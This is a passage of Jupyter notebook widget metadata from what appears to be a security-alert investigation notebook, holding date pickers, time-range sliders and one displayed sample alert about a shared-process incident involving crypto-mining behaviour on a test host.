       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_9505fe8452f1414390c0a29e907fdf39",
        "IPY_MODEL_5a003bd59ef64ef488c75ed384a7d693"
       ],
       "layout": "IPY_MODEL_c08c9581bc7346d6a8a90ac5b8178187"
      }
     },
     "b2a97300e1564e148d1bae5f390ae8a8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_e2ec1807ff724225b12dfc64d29b4a29",
        "IPY_MODEL_73eba89b5d8a4ee8b656dfa58166bf4a"
       ],
       "layout": "IPY_MODEL_1e2f36606d8f45199e0adb4ae2ca813d"
      }
     },
     "b3a0b8b4d6674019b5065916dcde07ad": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_ce259ece6bc241a784f5f7d9ad78a517",
       "style": "IPY_MODEL_df71befca2a24774adc0c48c67419dc7",
       "value": {
        "date": 10,
        "month": 1,
        "year": 2019
       }
      }
     },
     "b4cb865d8917495888566a9621ec3282": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "b71039b4dc514217af2555b0ce210473": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "b89ce84913114df6bd57335caa98c566": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "b956eea20b28466f8de7eb123581c9b0": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "b9e22418835049b984dd56f60c26a43a": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "ba2df5fe425341b1ad2f06a9f4196185": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "bb88a9f403734c769682b50ac440928d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "bbc0a917639543d88ae627084cc018d9": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "bcb162f7f89f4cadb769e4f3bd45b637": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_28720056a4be44c18a406ab517273e94",
       "style": "IPY_MODEL_bd7ad1480ba84e498b811ca34267d1d9",
       "value": "05:38:41"
      }
     },
     "bd3034bd462d481d85cb48de040a71f3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_6c6ac4ccfe8b4229b7517a390a521f8f",
       "max": 1,
       "min": -28,
       "style": "IPY_MODEL_311d94ad2ad2401c8fbb1cbd5f835ab7",
       "value": [
        -5,
        1
       ]
      }
     },
     "bd40493e022644eeb10540d79eec3ca9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_7374809cbbc9407fa15ec3b91288c5d1",
       "style": "IPY_MODEL_a4699592fbf24981a5635839b4591306",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "bd7ad1480ba84e498b811ca34267d1d9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "bd9a085c387e4dc8b7b06f121c7ef3b8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "bff971b661bc448a94bf453f656e1501": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "c08c9581bc7346d6a8a90ac5b8178187": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "c1856d7dbe13451e9f92b2861dec081e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_7bd6082696f94668b4c8bde66e0d3a73",
       "style": "IPY_MODEL_53782b34830f49afb1b336eafddf8d85",
       "value": "2019-09-11 21:37:31"
      }
     },
     "c391e98afe7742949f8e657ac8dec020": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_564b39b1e35f4e70a24875dc574512b8",
       "style": "IPY_MODEL_1c653f39ba3940f4af33ae8f2cc1c7c5",
       "value": "06:15:06"
      }
     },
     "c4113a349abc41c89686c914abf33394": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_d33087af00fd46c98cd1fda707cf2606",
       "style": "IPY_MODEL_dcb3220e316245efbbd9e29a291b5700",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "c4fc62fc8fa14522bea8c3694329cc48": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_ccba1ba753f242a6b961f55fcfee03d9",
       "style": "IPY_MODEL_59cbe135ad4d43f1ae02b5b37341cc41",
       "value": "2019-02-11 06:15:06"
      }
     },
     "c594a229806c4c3d892c03881250b467": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "c5d95bafbe7f43b89d3ffe008212eb5b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_6e0b797586524ef6b7750951d823b710",
        "IPY_MODEL_3cc288f2b6e84398b863b5024422e7f1",
        "IPY_MODEL_d0bf45c729a74714b21f3214c7687a87"
       ],
       "layout": "IPY_MODEL_1842a582d94c419abd006d6ed49cbf09"
      }
     },
     "c6f575dd56994e33a826c2bc72bab586": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "c8ccd30004f64726827d1af906095a13": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "c8f4791b69a742eab7d35a6267a0789a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "c90581a762c54b41b113ba9516d77909": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_5f19de1029d64e0ca057b20ed687f965",
       "style": "IPY_MODEL_04f86b50e7d7452f9d3889359ee61484",
       "value": {
        "date": 10,
        "month": 1,
        "year": 2019
       }
      }
     },
     "c9bc4996f5bb417892f73c4737675e72": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "CheckboxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Center subsequent query times round selected Alert?",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_fe8a77a4fd294f77b3bd45368a74fb98",
       "style": "IPY_MODEL_c8f4791b69a742eab7d35a6267a0789a",
       "value": true
      }
     },
     "ca912305af3a4c029cfa6206e4f53b03": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "95%"
      }
     },
     "cac6f5b19ddf4ecfb35a7a8ecc7da5ab": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_185743dfde4248c191ba75a3afb9f571",
       "style": "IPY_MODEL_0951a96f620444c9816687f964090d08",
       "value": {
        "date": 12,
        "month": 8,
        "year": 2019
       }
      }
     },
     "cb67ea1f0ddb436eb14033ffa1dc4c56": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_b3a0b8b4d6674019b5065916dcde07ad",
        "IPY_MODEL_4385d9fe8bbe46a2b203bb1564643744"
       ],
       "layout": "IPY_MODEL_9a78f1e48f4349a09815fa04cfc3afff"
      }
     },
     "cc34b8f27c684821b92207e06d509f08": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "cc8538bb8a374a098b2974b23821b342": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_23d565d3cc9e4affbe241267b91486f1",
        "IPY_MODEL_1380d313b0fd42468bbf11609769a011",
        "IPY_MODEL_5e529fbe9fc54ecbbc77fc97c097d383"
       ],
       "layout": "IPY_MODEL_23e8b896c4254270809a94cdf4f9d972"
      }
     },
     "ccba1ba753f242a6b961f55fcfee03d9": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "cd5131201db1400f81060e796a383b0e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_73f30ba22adf4c38b14d54ea956693cc",
       "style": "IPY_MODEL_43fd937b357a44b9a1a47c55cd892e18",
       "value": "2019-02-10 05:48:41"
      }
     },
     "ce259ece6bc241a784f5f7d9ad78a517": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "ce372fe3338f42059b4b2c03fc734e5c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "cea778f0f9f54851b7cfe63541d7dbed": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "cf24e0a5c9a44703b2b6895bba77fb03": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_72ad58f2313a42aa9f3343f4b498d68f",
       "outputs": [
        {
         "data": {
          "text/html": "\n            <h3>Alert: 'Security incident with shared process detected'</h3><br>time=<b>2019-02-09 23:26:48</b>,\n            entity=<b>MSTICALERTSWIN1</b>, id=<b>2518525459919272837_a346dd76-a51d-464e-afc5-c6e5c6a8fc6e</b>\n            ",
          "text/plain": "<IPython.core.display.HTML object>"
         },
         "metadata": {},
         "output_type": "display_data"
        },
        {
         "data": {
          "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>0</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>TenantId</th>\n      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n    </tr>\n    <tr>\n      <th>TimeGenerated</th>\n      <td>2019-02-10 05:38:41</td>\n    </tr>\n    <tr>\n      <th>AlertDisplayName</th>\n      <td>Security incident with shared process detected</td>\n    </tr>\n    <tr>\n      <th>AlertName</th>\n      <td>Security incident with shared process detected</td>\n    </tr>\n    <tr>\n      <th>Severity</th>\n      <td>High</td>\n    </tr>\n    <tr>\n      <th>Description</th>\n      <td>The incident which started on 2019-02-09 23:26:48 UTC and recently detected on 2019-02-10 05:38:...</td>\n    </tr>\n    <tr>\n      <th>ProviderName</th>\n      <td>Detection</td>\n    </tr>\n    <tr>\n      <th>VendorName</th>\n      <td>Microsoft</td>\n    </tr>\n    <tr>\n      <th>VendorOriginalId</th>\n      <td>a346dd76-a51d-464e-afc5-c6e5c6a8fc6e</td>\n    </tr>\n    <tr>\n      <th>SystemAlertId</th>\n      <td>2518525459919272837_a346dd76-a51d-464e-afc5-c6e5c6a8fc6e</td>\n    </tr>\n    <tr>\n      <th>ResourceId</th>\n      <td>/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/provide...</td>\n    </tr>\n    <tr>\n      <th>SourceComputerId</th>\n      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n    </tr>\n    <tr>\n      <th>AlertType</th>\n      <td>KillChainFusionIncident</td>\n    </tr>\n    <tr>\n      <th>ConfidenceLevel</th>\n      <td>Unknown</td>\n    </tr>\n    <tr>\n      <th>ConfidenceScore</th>\n      <td>NaN</td>\n    </tr>\n    <tr>\n      <th>IsIncident</th>\n      <td>True</td>\n    </tr>\n    <tr>\n      <th>StartTimeUtc</th>\n      <td>2019-02-09 23:26:48</td>\n    </tr>\n    <tr>\n      <th>EndTimeUtc</th>\n      <td>2019-02-09 23:26:48</td>\n    </tr>\n    <tr>\n      <th>ProcessingEndTime</th>\n      <td>2019-02-10 05:38:41</td>\n    </tr>\n    <tr>\n      <th>RemediationSteps</th>\n      <td>[\\r\\n  \"1. Escalate the alert to the information security team.\",\\r\\n  \"2. Review the remediatio...</td>\n    </tr>\n    <tr>\n      <th>ExtendedProperties</th>\n      <td>{'isincident': 'true', 'Detected Time (UTC)': '2019-02-10 05:38:41 UTC', 'Incident Stage': 'abus...</td>\n    </tr>\n    <tr>\n      <th>Entities</th>\n      <td>[{'$id': '4', 'DisplayName': 'Digital currency mining related behavior detected', 'CompromisedEn...</td>\n    </tr>\n    <tr>\n      <th>SourceSystem</th>\n      <td>Detection</td>\n    </tr>\n    <tr>\n      <th>WorkspaceSubscriptionId</th>\n      <td>40dcc8bf-0478-4f3b-b275-ed0a94f2c013</td>\n    </tr>\n    <tr>\n      <th>WorkspaceResourceGroup</th>\n      <td>asihuntomsworkspacerg</td>\n    </tr>\n    <tr>\n      <th>ExtendedLinks</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>ProductName</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>ProductComponentName</th>\n      <td></td>\n    </tr>\n    <tr>\n      <th>Type</th>\n      <td>SecurityAlert</td>\n    </tr>\n    <tr>\n      <th>CompromisedEntity</th>\n      <td>MSTICALERTSWIN1</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
          "text/plain": "                                                                                                                           0\nTenantId                                                                                52b1ab41-869e-4138-9e40-2a4457f09bf0\nTimeGenerated                                                                                            2019-02-10 05:38:41\nAlertDisplayName                                                              Security incident with shared process detected\nAlertName                                                                     Security incident with shared process detected\nSeverity                                                                                                                High\nDescription              The incident which started on 2019-02-09 23:26:48 UTC and recently detected on 2019-02-10 05:38:...\nProviderName                                                                                                       Detection\nVendorName                                                                                                         Microsoft\nVendorOriginalId                                                                        a346dd76-a51d-464e-afc5-c6e5c6a8fc6e\nSystemAlertId                                                       2518525459919272837_a346dd76-a51d-464e-afc5-c6e5c6a8fc6e\nResourceId               /subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/provide...\nSourceComputerId                                                                        263a788b-6526-4cdc-8ed9-d79402fe4aa0\nAlertType                                                                                            KillChainFusionIncident\nConfidenceLevel                                                                                                      Unknown\nConfidenceScore                                                                                                          NaN\nIsIncident                                                                                                              True\nStartTimeUtc                                                                                             2019-02-09 23:26:48\nEndTimeUtc                                                                                               2019-02-09 23:26:48\nProcessingEndTime                                                                                        2019-02-10 05:38:41\nRemediationSteps         [\\r\\n  \"1. Escalate the alert to the information security team.\",\\r\\n  \"2. Review the remediatio...\nExtendedProperties       {'isincident': 'true', 'Detected Time (UTC)': '2019-02-10 05:38:41 UTC', 'Incident Stage': 'abus...\nEntities                 [{'$id': '4', 'DisplayName': 'Digital currency mining related behavior detected', 'CompromisedEn...\nSourceSystem                                                                                                       Detection\nWorkspaceSubscriptionId                                                                 40dcc8bf-0478-4f3b-b275-ed0a94f2c013\nWorkspaceResourceGroup                                                                                 asihuntomsworkspacerg\nExtendedLinks                                                                                                               \nProductName                                                                                                                 \nProductComponentName                                                                                                        \nType                                                                                                           SecurityAlert\nCompromisedEntity                                                                                            MSTICALERTSWIN1"
         },
         "metadata": {},
         "output_type": "display_data"
        }
       ]
      }
     },
     "d0bf45c729a74714b21f3214c7687a87": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_8e1086fc5f1d4b4295d81310e84180cd",
       "style": "IPY_MODEL_7200e36683994493b0ad1802d5d2e8d8",
       "value": "2019-09-12 21:59:31"
      }
     },
     "d259a6bec22e4d538d6ab72ac334f51d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_fbe590e1410948238b117883053f1eee",
       "max": 1,
       "min": -28,
       "style": "IPY_MODEL_9c7d470558804e558e4c959acca07aaf",
       "value": [
        -5,
        1
       ]
      }
     },
     "d2d0947b5369498a9f60e2c7c3a67551": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_b1e281669e5e4b979e1bce542d667d80",
        "IPY_MODEL_c391e98afe7742949f8e657ac8dec020"
       ],
       "layout": "IPY_MODEL_29d71838a6514018b87bfe549afd5f2f"
      }
     },
     "d33087af00fd46c98cd1fda707cf2606": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "d36c41a637db401b947fd4487d5cb005": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_bbc0a917639543d88ae627084cc018d9",
       "style": "IPY_MODEL_97102f7381264aa5b18f7d19fe4f737b",
       "value": "2019-02-05 05:38:41"
      }
     },
     "d4c3e573cde24c858ae3186d5a6f21c4": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "d63b59d1be914f1bbaf42fa74aa5722b": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "d702c19f83ed48a28490fcf9a3f71136": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "d802d09a62cb4c519cbb7dc729f6e54d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_7dfded9b300f46a3b4d5c0fc6ee685e3",
       "max": 1,
       "min": -20,
       "style": "IPY_MODEL_e9c201b71f1c46a1b635e00a3736c8d6",
       "value": [
        -1,
        0
       ]
      }
     },
     "d8622620ac354b089763df091127c13b": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "d9e0c3fe5dff4fcfa98607d74f2c8e48": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "dc9ea094a31e4c5b8d5de8d78e55b19a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "dcb3220e316245efbbd9e29a291b5700": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "df71befca2a24774adc0c48c67419dc7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
